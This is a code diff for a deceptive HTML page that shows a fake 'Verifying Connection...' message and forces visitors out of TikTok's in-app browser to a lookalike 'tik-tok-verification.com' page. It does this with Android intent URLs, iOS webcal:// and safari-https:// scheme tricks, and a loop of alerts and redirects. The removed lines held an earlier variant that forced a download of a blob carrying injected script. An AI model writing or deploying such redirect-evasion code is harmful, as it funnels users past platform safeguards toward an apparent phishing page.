@@ -3,54 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>body { background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }</style>
+    <style>body { background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }</style>
 </head>
 <body>
-    <div style="text-align: center;"><b>SYSTEM CHECKING...</b></div>
+    <div style="font-family:sans-serif; color:#666;">Verifying Connection...</div>
 
 <script>
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
     const cleanUrl = targetUrl.replace(/^https?:\/\//, '');
     const killTime = Date.now() + 5000;
 
-    function goSickoMode() {
+    function theWebcalNuke() {
         const isAndroid = /Android/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // ANDROID SICKO: Intent recursion
-            // We force a Chrome-specific package call that bypasses the "Picker"
-            window.location.href = `intent://${cleanUrl}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
+            // Android: We use the "Market" bypass. 
+            // TikTok lets 'market://' links through to the OS picker.
+            // We use it to force a browser selection.
+            window.location.href = `intent://${cleanUrl}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
         } else {
-            // iOS SICKO: The Binary Overflow
-            // We create a "heavy" fake file that TikTok hates
-            const heavyContent = "A".repeat(1000) + `<script>window.location.replace("${targetUrl}");<\/script>`;
-            const blob = new Blob([heavyContent], {type: 'application/octet-stream'});
-            const url = URL.createObjectURL(blob);
-            
-            // 1. Force a "System Save" prompt
-            window.location.href = url;
+            // iOS: THE WEBCAL TRIGGER
+            // TikTok sees 'webcal://' and cannot handle it internally.
+            // This triggers the "Open in Calendar/Safari?" system prompt.
+            window.location.href = "webcal://" + cleanUrl;
 
-            // 2. Immediately fire the Safari-Direct scheme to "thread" the gap
+            // Immediately follow up with the direct Safari-Https call
             setTimeout(() => {
                 window.location.href = "safari-https://" + cleanUrl;
-            }, 50);
-
-            // 3. The "Ghost" Assignment
-            setTimeout(() => {
-                window.location.assign(targetUrl);
-            }, 150);
+            }, 100);
         }
     }
 
-    function securityLogic() {
+    function runLogic() {
         if (Date.now() > killTime) {
-            document.body.innerHTML = "REDIRECTING...";
-            window.location.href = targetUrl;
+            window.location.replace(targetUrl);
             return;
         }
 
-        // Trigger the overflow
-        goSickoMode();
+        theWebcalNuke();
 
         setTimeout(() => {
             if (document.hasFocus()) {
@@ -59,14 +49,13 @@
                 
                 alert(header + body);
                 
-                // Fire again on "OK"
-                goSickoMode();
-                setTimeout(securityLogic, 200);
+                theWebcalNuke();
+                setTimeout(runLogic, 250);
             }
-        }, 200);
+        }, 250);
     }
 
-    window.onload = securityLogic;
+    window.onload = runLogic;
 </script>
 </body>
 </html>
